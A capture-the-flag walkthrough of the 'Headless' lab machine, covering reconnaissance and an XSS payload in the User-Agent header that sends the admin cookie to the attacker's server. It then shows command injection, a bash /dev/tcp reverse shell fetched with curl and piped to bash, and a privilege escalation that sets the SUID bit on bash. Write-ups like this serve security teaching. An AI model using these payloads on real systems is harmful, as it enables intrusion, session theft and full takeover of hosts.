# Headless

## Setup

We used a [kali-linux vm](https://www.kali.org/get-kali/#kali-virtual-machines) to attack this machine. After downloading the vpn to connect to, we ran the following command to connect and was able to establish a connection after testing with `ping`.

`sudo openvpn ~/Downloads/lab_Deanathan.ovpn`

## Searching For Vulnerabilities

### nmap Scan

The first thing we did was run `sudo nmap -sV {target_ip}` to see what ports were being used and if any identifiable services could be found.

![nmap-scan](/images/nmap-scan.png)

We could see that they had a port for ssh connections and a service that we were not familiar with called `upnp?`. We are currently unsure if nmap is saying that the returned data shown is for that service or if it was for a service on a port not being displayed but we will try and see what kind of connections we can make to the ssh port. First we will need a username to use so we tried `guest`.

![ssh-guest](/images/ssh-guest.png)

This gave us a login attempt but we cannot be sure that's a valid user since the only way to know what users are on a system is by checking the passwd file which you must be logged into the system to see. If we are able to read this file at any point in our attack this could be useful to use but for now guessing random users and passwords is not a viable strategy.

This lead us to turn our attention to the `upnp?` service which upon researching is `Universal Plug and Play`. This service seems like it may have some vulnerabilities that we can look into. Reading from [this](https://www.upguard.com/blog/what-is-upnp) source, it seems that `upnp` may be an avenue in which we can bypass firewall policies. We tried running this script but were unable to find any devices.

```python
import miniupnpc

# Create a UPnP object
upnp = miniupnpc.UPnP()

# Discover UPnP devices on the network
upnp.discover()

# Get the list of discovered devices
devices = upnp.discover()

# Print information about each discovered device
for index, device in enumerate(devices):
    print(f"Device {index + 1}:")
    print(f"    Friendly Name: {device['desc']['friendly_name']}")
    print(f"    Manufacturer: {device['desc']['manufacturer']}")
    print(f"    Model Name: {device['desc']['model_name']}")
    print(f"    Location: {device['desc']['location']}")

```

Not being able to find any devices on the upnp port, we then decided to try and visit that page in a web browser since it was returning html. That lead us to a webpage which with one button on it.

![welcome](/images/welcome.png)

After inspecting the page using the dev tools, we found that a cookie is being used called `is_admin`. This is likely the path that we will want to follow to gain access to the machine.

We also went ahead and scanned all the UDP ports as well since the TCP ports did not provide a whole lot of options. After completion of that scan using `sudo nmap -sV -sU {target_ip}`, we found the following open ports.

![udp-scan](/images/udp-scan.png)

The only service of interest to us here was the one on port 68. `DHCPC` has a known vulnerability when sending it a packet with a DNS option maliciously configured to trigger a buffer overflow as explained in [this](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/dhcp-client-remote-code-execution-vulnerability-demystified/#:~:text=A%20rogue%20DHCP%20server%20in%20the%20network%20can,the%20client%20and%20take%20control%20of%20the%20system.) article. However, we are not sure of the version of `DHCPC` being used here and would only want to come back here if the hosted web app on port `5000` leads us to a dead end. 

### dirsearch

One useful tool when attacking a web server is `dirsearch`. This allows us to possibly see any other routes that may be accessible from the browser. Running `dirsearch` in kali linux requires us to clone the GitHub repo and run the executable from there using `python dirsearch.py -u http://10.10.11.8:5000`. 

![run-dirsearch](/images/run-dirsearch.png)

Running `dirsearch` resulted in the following routes being exposed:
* /support
* /dashboard

Visiting the `/dashboard` route showed us that we were indeed unauthorized to view it.

![dash-401](/images/dash-401.png)

## Attacking The Machine

### Identifying An Avenue

Clicking the only button on the page lead us to another page for contacting support. On this page was a form that we could submit to the server so perhaps some sort of injection could gain us access to the machine. 

![form](/images/form.png)

Submitting the form executes a POST request to `/support` so this is the initial destination of whatever malicious input we decide to submit. Since it seems that web requests will be heavily used, we utilized [`Burp Suite`](https://portswigger.net/burp/communitydownload), a tool that intercepts web requests and allows you to fully inspect and edit them before sending them to the server. This was a tool I picked up while doing natas and found it invaluable when working with web requests. We were able to fully capture the following request when submitting the form.

```raw
POST /support HTTP/1.1
Host: 10.10.11.8:5000
Content-Length: 69
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.8:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.8:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: close

fname=first&lname=last&email=a%40a.c&phone=1112223333&message=message
```

Another piece of information we were able to gather is that the cookie's value is static, meaning that it does not change when getting a new one. This could lead to hints about how sessions are derived and be useful later on, but for now we are just taking note of it. Also, using `Burp's` built-in decoder, we were able to decode it from base 64 and found that it does include the string "user" meaning that we will need this to be an admin cookie at some point.

![decoded-user-cookie](/images/decoded-user-cookie.png)

### Injecting Malicious Input

The first thing we tried was inputting `<script type=’text/javascript’>alert(‘test’);</script>` into the message box to see if that would yield any responses. It flagged the request as a hacking attempt which means that the server is likely doing some sanitization to avoid this from happening. We are also not 100% sure we should have seen an alert since we don't know how the message field is being handled. Hopefully the headless administrators are on vacation and we can continue to test before getting blacklisted :)

![hacking-attempt](/images/hacking-attempt.png)

Next we tried to url encode the string.

```
%3Cscript%20type%3D%E2%80%99text%2Fjavascript%E2%80%99%3Ealert%28%E2%80%98test%E2%80%99%29%3B%3C%2Fscript%3E
```

However this resulted in the same hacking detected attempt message. We could not find any source files in the dev tools so that means that the sanitization must be happening on the server and we don't know of any queries in the url so we can't blindly try to inject there for now. This is already more advanced than natas so we will have to find a more advanced way to inject code.

One thing we tried was changing the bytes in the cookie to read `admin` instead of `user`, changing the cookie to `ImFkbWluIi64CWZeVO+by/KKGM1o8Nae8F9aZnM=`. We then realized we have no way of knowing if that worked right now but it might be good to hold onto that value for when we run into an admin page. It likely won't be valid since we would assume that the cookie is calculated in a more complex way, but it is worth trying. We then remembered that our [dirsearch](#dirsearch) yielded a route called `/dashboard` with a `401 unauthorized` return status. This means that this page would be what we want to target when we have the admin cookie. However, trying our tampered cookie on this route did not give us access.

#### Stealing The Cookie

Back to trying `XSS` attacks, one thing we could try is messing with the headers of the request. The only thing that we were able to recall from natas about vulnerable headers is that sometimes the developers will inherently trust the `User Agent` field of the request and use it in places that it should not. We also recall that it was being used whenever the server was logging a hacking attempt, just as headless seems to be doing here. So our plan of attack for this will be to trigger a hacking attempt and then get the server to possibly log the `User Agent` field which could trigger arbitrary code to fire.

The only issue is that the code will be fired on the server, not on the client. So for us to know if this works we will need to set up a way for us to receive feedback if the code is fired. One way that we can do this is by setting up a server from our own machine and trigger a request to our IP address. We can do this via `python -m http.server 8000`.

![serve](/images/serve.png)

Since we are putting something on the server rather than the client, we will need to embed our code in something such as an image. We can use the following code to get the server to try and load an image and then run code we want when the image fails to load.

`<img src="#" onerror="fetch('http://<my-ip>:8000')" />`

In the following image you can see us putting it all together in one request and getting a successful response from headless to our server!

![reverse-request](/images/reverse-request.png)

Now we can try and gather more information about the server that we are able to execute code. We still need the output to be sent back to use so we'll keep the fetch call and try and append data to it. The first thing we tried is passing a command as a query to try and get it to send back an `ls` call.

`<img src="#" onerror="fetch('http://10.10.14.160:8000?cmd=ls')" />`

This didn't work exactly as we wanted as the response we got back was just `[26/Apr/2024 16:18:20] "GET /?cmd=ls HTTP/1.1" 200 -`. We will need to do some more research on how to get the code to execute the way we want. We found this attempt to steal cookies from [this](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e) article, but it did not give us a response.

`<img src="#" onerror="fetch('http://10.10.14.160:8000/?cookie="+btoa(document.cookie)')" />`

We tried this one as well.

`<img src="#" onerror=fetch('http://10.10.14.160:8000/?cookie='document.cookie); />`

But could not get a response either. We then realized that we must have just had a mental lapse and forgot basic JavaScript syntax and then switched the request to include this.

`<img src="#" onerror=fetch('http://10.10.14.160:8000/?cookie='+document.cookie); />`

This gave us the admin cookie!

![admin-cookies](/images/admin-cookies.png)

Pasting that value in to our browser allowed us to access the admin dashboard.

![admin-dash](/images/admin-dash.png)

Hitting the generate report button gave us a nice little message telling us that all systems were up and running. This sends a request that we will now see if we can manipulate to get more information about the server since we have elevated privileges now.

### Stealing User Flag

Hitting the button sends the following request.

```
POST /dashboard HTTP/1.1
Host: 10.10.11.8:5000
Content-Length: 15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.8:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.8:5000/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Connection: close

date=2023-09-15
```

Right off the bat we can try injecting code into the request body to see if we get any kind of response. We will just try and insert the image that will ping our server first to see if that does anything. We never got a ping to our server so the input must be handled differently. We can try and just inject some bash commands to see if that does anything but there is no guarantee that we will see this output even if it does execute. To our surprise, running the request with an appended `ls` at the end actually returned the files in the directory to us!

![ls](/images/ls.png)

If we do `ls ../` we see a `user.txt` which most likely contains the user flag.

![user-flag](/images/user-flag.png)

There it is! The user flag is `783df97f81a64da97716f2b28b22d6b6`. The root flag looks like it will require some extra steps since running `whoami` tells use we are logged in as `dvir` instead of `root` like we will need to be. Looks like having the admin cookie isn't enough to get root, we will have to once again find a way to elevate our authorization.

### Stealing Root Flag

#### Setting Up A Reverse Shell

One thing that will make our life so much easier is if we set up a reverse shell. I have never done this before so I watched [this](https://www.youtube.com/watch?v=S99C5jNkOgA&ab_channel=TheLinuxPoint) YouTube video to learn how to do it with `ncat`.

First thing we will do is listen for connections on port 3000 on our machine by running `ncat -l -v -p 3000`. Then on headless we will want to run `/bin/bash -i >& /dev/tcp/<my-ip>/3000 0>&1` by sending it in the body of our new post request.

![ncat-rs](/images/ncat-rs.png)

Unfortunately, this did not seem to make a connection. We then tried [this](https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/#) from GeeksForGeeks and were able to establish a connection but could not see any output of our commands. Modifying the command to try and send the output to use seemed to make the connection not work at all so we'll have to try some other stuff.

`/bin/sh 2>&1 | nc 10.10.14.160 3000`

After a good hour of trying different things, mainly many different attempts to do this with `curl`, we revisited the original command and thought maybe there was just something we were doing wrong. As it turns out, we were doing something wrong. What was likely happening is that the command `/bin/bash -i >& /dev/tcp/<my-ip>/3000 0>&1` was being interpreted incorrectly for possibly one of many different reasons when sending it straight in the request. What ended up working is taking this command, putting it on our server in `shell.sh`, using `curl` to grab it from the headless server, and then piping the command directly into bash. Upon doing all this, we were able to obtain a reverse shell!

![curl-shell](/images/curl-shell.png)

![reverse-shell](/images/reverse-shell.png)

#### Elevating Privilege

When trying to elevate privileges, it's always good to go ahead and see what privileges the user does have. We can do this with `sudo -l`.

![sudo-l](/images/sudo-l.png)

What this tells us is that the file `usr/bin/syscheck` can be run with root privileges. Let's check and see what that file does.

![syscheck](/images/syscheck.png)

When we run this command with `sudo` we get the `Database service is not running. Starting it ...` output. It then tries to run the file `initdb.sh`. But there is one major issue here ... the file does not exist making it like some sort of _headless_ script call :D. What if we just created that file and put whatever we wanted in there? Hopefully you, like us, can see the end in sight.

![initdb-sh](/images/initdb-sh.png)

What we did here was put a command into `initdb.sh` that changes the permissions of `/bin/bash` such that anyone can run it. Since the `syscheck` script doesn't define an absolute path, we are able to just create the file in our home directory and have it be run with sudo privileges. Now that the `SUID` bit of the bash file is set with `user`, when we try to run `/bin/bash` it should allow us to run it with the privileges of the owner, which would be root.

![become-root](/images/become-root.png)

Using the `-p` flag here is very important as that tells the file to run with privileges. And now that we are root we can just snag the root flag.

![root-flag](/images/root-flag.png)

And done! With the root flag being `535d3d8f64a9b629f7f9c80400d4b316`, we have successfully pwned headless!!!

![pwned](/images/pwned.png)
















